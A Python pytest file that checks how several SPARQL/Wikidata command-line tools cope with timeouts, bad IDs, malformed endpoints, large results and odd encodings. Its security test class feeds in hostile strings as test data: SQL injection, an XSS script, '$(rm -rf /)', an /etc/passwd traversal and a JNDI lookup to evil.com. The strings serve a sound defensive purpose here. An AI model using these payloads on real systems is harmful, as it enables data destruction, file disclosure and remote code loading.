"""Error handling tests for CLI tools.

Test robustness and graceful failure handling for agents.
"""

import json
import subprocess
from pathlib import Path
from typing import List
from unittest.mock import patch

import pytest
from fastcore.test import test_eq


def run_cli_command(command: str, args: List[str], timeout: int = 10) -> subprocess.CompletedProcess:
    """Run CLI command with shorter timeout for error tests."""
    cmd = ["uv", "run", command] + args
    return subprocess.run(
        cmd,
        capture_output=True,
        text=True,
        timeout=timeout,
        cwd=Path(__file__).parent.parent
    )


class TestNetworkErrorHandling:
    """Test handling of network-related errors."""
    
    def test_network_timeout_handling(self):
        """Test handling of network timeouts."""
        # Use very short timeout to force timeout
        result = run_cli_command("cl_search", ["test", "--endpoint", "wikidata", "--format", "json"], timeout=1)
        
        # Should either succeed quickly or fail gracefully
        if result.returncode != 0:
            # If it fails, should return proper JSON error
            try:
                error_data = json.loads(result.stderr)
                assert "error" in error_data
            except json.JSONDecodeError:
                # Or at least not crash completely
                assert "error" in result.stderr.lower() or "timeout" in result.stderr.lower()
    
    def test_invalid_endpoint_url(self):
        """Test handling of invalid endpoint URLs."""
        # Try searching with clearly invalid endpoint
        result = run_cli_command("cl_search", ["test", "--endpoint", "invalid-url-test", "--format", "json"])
        
        # Should handle gracefully
        test_eq(result.returncode, 0)  # Shouldn't crash
        data = json.loads(result.stdout)
        test_eq(data["endpoint"], "invalid-url-test")
        # Results might be empty but shouldn't crash
        assert isinstance(data["results"], list)
    
    def test_network_unavailable(self):
        """Test behavior when network is unavailable."""
        # This test simulates network issues by using invalid URLs
        # In real scenarios, this would test offline behavior
        result = run_cli_command("cl_fetch", ["Q123", "--format", "json"], timeout=5)
        
        # Should either succeed or fail gracefully with proper error message
        if result.returncode != 0:
            error_data = json.loads(result.stderr)
            assert "error" in error_data
            assert isinstance(error_data["error"], str)


class TestInvalidInputHandling:
    """Test handling of invalid user inputs."""
    
    def test_invalid_sparql_queries(self):
        """Test handling of malformed SPARQL queries."""
        invalid_queries = [
            "INVALID SYNTAX",
            "SELECT WHERE { ?s ?p ?o }",  # Missing variable
            "SELECT ?s ?p ?o WHERE {",    # Incomplete
            "",                           # Empty
            "DELETE { ?s ?p ?o } WHERE { ?s ?p ?o }"  # Dangerous operation
        ]
        
        for query in invalid_queries:
            result = run_cli_command("cl_query", [query, "--format", "json"])
            
            if result.returncode == 1:  # Expected failure
                error_data = json.loads(result.stderr)
                assert "error" in error_data
                print(f"✅ Correctly rejected: {query[:20]}...")
            else:
                # If it doesn't fail, should at least return empty results
                data = json.loads(result.stdout)
                assert "results" in data
    
    def test_missing_entities(self):
        """Test handling of non-existent entity IDs."""
        nonexistent_ids = [
            "Q999999999",           # Non-existent Wikidata ID
            "INVALID_ID",           # Invalid format
            "WP999999_r999999",     # Non-existent WikiPathways ID
            "P999999",              # Non-existent UniProt ID
            ""                      # Empty ID
        ]
        
        for entity_id in nonexistent_ids:
            if entity_id == "":
                # Empty ID should fail with proper error
                result = run_cli_command("cl_fetch", [entity_id, "--format", "json"])
                test_eq(result.returncode, 1)
                error_data = json.loads(result.stderr)
                assert "error" in error_data
            else:
                # Non-existent IDs should return graceful error or empty result
                result = run_cli_command("cl_fetch", [entity_id, "--format", "json"])
                test_eq(result.returncode, 0)  # Shouldn't crash
                
                data = json.loads(result.stdout)
                # Should either have error field or be empty
                assert "error" in data or data.get("id") == entity_id
    
    def test_malformed_endpoints(self):
        """Test handling of malformed endpoint specifications."""
        malformed_endpoints = [
            "",                    # Empty
            "not-a-url",          # Invalid format
            "http://",            # Incomplete URL
            "ftp://invalid.com",  # Wrong protocol
            "https://nonexistent-domain-12345.com"  # Non-existent domain
        ]
        
        for endpoint in malformed_endpoints:
            if endpoint == "":
                # Empty endpoint should fail
                result = run_cli_command("cl_discover", [endpoint])
                test_eq(result.returncode, 1)
            else:
                # Others should handle gracefully
                result = run_cli_command("cl_discover", [endpoint, "--format", "json"])
                test_eq(result.returncode, 0)
                
                data = json.loads(result.stdout)
                test_eq(data["endpoint"], endpoint)
    
    def test_invalid_format_options(self):
        """Test handling of invalid format options."""
        # Try invalid format
        result = run_cli_command("cl_search", ["test", "--format", "invalid"])
        test_eq(result.returncode, 2)  # Click validation error
        assert "invalid choice" in result.stderr.lower() or "usage:" in result.stderr.lower()
    
    def test_invalid_limit_values(self):
        """Test handling of invalid limit values."""
        invalid_limits = ["-1", "0", "abc", "999999"]
        
        for limit in invalid_limits:
            result = run_cli_command("cl_search", ["test", "--limit", limit])
            
            if limit in ["-1", "abc"]:
                # Should fail validation
                test_eq(result.returncode, 2)
            else:
                # Should handle gracefully
                assert result.returncode in [0, 1, 2]


class TestResourceLimitHandling:
    """Test handling of resource limits and large responses."""
    
    def test_large_query_results(self):
        """Test handling of queries that return many results."""
        # Query that might return many results
        large_query = "SELECT ?item WHERE { ?item wdt:P31 wd:Q5 } LIMIT 1000"  # Humans
        result = run_cli_command("cl_query", [large_query, "--format", "json"], timeout=15)
        
        if result.returncode == 0:
            data = json.loads(result.stdout)
            # Should handle large results gracefully
            assert len(data["results"]) <= 1000
            assert data["count"] == len(data["results"])
        else:
            # If it fails, should be graceful failure
            error_data = json.loads(result.stderr)
            assert "error" in error_data
    
    def test_memory_usage_with_large_responses(self):
        """Test memory usage doesn't grow excessively with large responses."""
        import psutil
        import os
        
        process = psutil.Process(os.getpid())
        initial_memory = process.memory_info().rss / 1024 / 1024  # MB
        
        # Run several large queries
        for i in range(3):
            result = run_cli_command("cl_search", ["protein", "--limit", "50", "--format", "json"])
            if result.returncode == 0:
                data = json.loads(result.stdout)
                # Process results to simulate real usage
                _ = len(str(data))
        
        final_memory = process.memory_info().rss / 1024 / 1024  # MB
        memory_increase = final_memory - initial_memory
        
        # Memory increase should be reasonable (less than 100MB for this test)
        assert memory_increase < 100, f"Memory increased by {memory_increase:.1f}MB"
        print(f"✅ Memory usage: +{memory_increase:.1f}MB")
    
    def test_concurrent_request_handling(self):
        """Test handling of concurrent requests (if applicable)."""
        import threading
        import time
        
        results = []
        errors = []
        
        def run_search(term):
            try:
                result = run_cli_command("cl_search", [f"{term}", "--limit", "2", "--format", "json"])
                if result.returncode == 0:
                    data = json.loads(result.stdout)
                    results.append(data)
                else:
                    errors.append(result.stderr)
            except Exception as e:
                errors.append(str(e))
        
        # Run concurrent searches
        threads = []
        search_terms = ["insulin", "protein", "gene", "pathway"]
        
        for term in search_terms:
            thread = threading.Thread(target=run_search, args=(term,))
            threads.append(thread)
            thread.start()
        
        # Wait for all to complete
        for thread in threads:
            thread.join(timeout=30)
        
        # Should handle concurrent requests without major issues
        success_rate = len(results) / len(search_terms)
        assert success_rate >= 0.5, f"Success rate too low: {success_rate:.1f}"
        print(f"✅ Concurrent handling: {len(results)}/{len(search_terms)} succeeded")


class TestDataIntegrityErrors:
    """Test handling of data integrity issues."""
    
    def test_corrupted_response_handling(self):
        """Test handling of corrupted or unexpected response formats."""
        # This would normally require mocking, but we can test with edge cases
        
        # Test with entity that might have unusual data
        result = run_cli_command("cl_fetch", ["Q1", "--format", "json"])  # Universe entity
        
        if result.returncode == 0:
            data = json.loads(result.stdout)
            # Should have consistent structure even for complex entities
            assert "id" in data
            assert "type" in data
        else:
            # Should fail gracefully
            error_data = json.loads(result.stderr)
            assert "error" in error_data
    
    def test_encoding_issues(self):
        """Test handling of special characters and encoding issues."""
        special_queries = [
            "α-synuclein",          # Greek letters
            "β-amyloid",            # Beta symbol
            "café",                 # Accented characters
            "日本語",                # Non-Latin script
            "🧬DNA🧬",              # Emojis
        ]
        
        for query in special_queries:
            result = run_cli_command("cl_search", [query, "--limit", "1", "--format", "json"])
            
            # Should handle gracefully without encoding errors
            test_eq(result.returncode, 0)
            data = json.loads(result.stdout)
            test_eq(data["query"], query)
            # Results might be empty but should not crash
            assert isinstance(data["results"], list)
    
    def test_json_parsing_errors(self):
        """Test handling of malformed JSON responses (if any)."""
        # Test tools that should always return valid JSON
        result = run_cli_command("cl_search", ["test", "--format", "json"])
        test_eq(result.returncode, 0)
        
        # Should always be valid JSON
        try:
            data = json.loads(result.stdout)
            assert isinstance(data, dict)
            assert "query" in data
            assert "results" in data
        except json.JSONDecodeError as e:
            pytest.fail(f"Invalid JSON output: {e}")


class TestSecurityConstraints:
    """Test security-related error handling."""
    
    def test_injection_prevention(self):
        """Test prevention of injection attacks in queries."""
        malicious_inputs = [
            "'; DROP TABLE users; --",
            "<script>alert('xss')</script>",
            "$(rm -rf /)",
            "../../etc/passwd",
            "${jndi:ldap://evil.com/a}"
        ]
        
        for malicious_input in malicious_inputs:
            # Test in search
            result = run_cli_command("cl_search", [malicious_input, "--format", "json"])
            test_eq(result.returncode, 0)  # Should not crash
            
            # Should treat as literal search term
            data = json.loads(result.stdout)
            test_eq(data["query"], malicious_input)
            
            # Test in SPARQL query
            malicious_query = f"SELECT ?s WHERE {{ ?s rdfs:label '{malicious_input}' }}"
            result = run_cli_command("cl_query", [malicious_query, "--format", "json"])
            
            # Should either work safely or fail gracefully
            assert result.returncode in [0, 1]
    
    def test_resource_exhaustion_prevention(self):
        """Test prevention of resource exhaustion attacks."""
        # Very large limits should be handled
        result = run_cli_command("cl_search", ["test", "--limit", "999999", "--format", "json"])
        
        if result.returncode == 0:
            data = json.loads(result.stdout)
            # Should limit actual results to reasonable number
            assert len(data["results"]) <= 10000  # Reasonable upper bound
        else:
            # Or fail gracefully
            assert "error" in result.stderr or result.returncode == 2


if __name__ == "__main__":
    pytest.main([__file__, "-v"])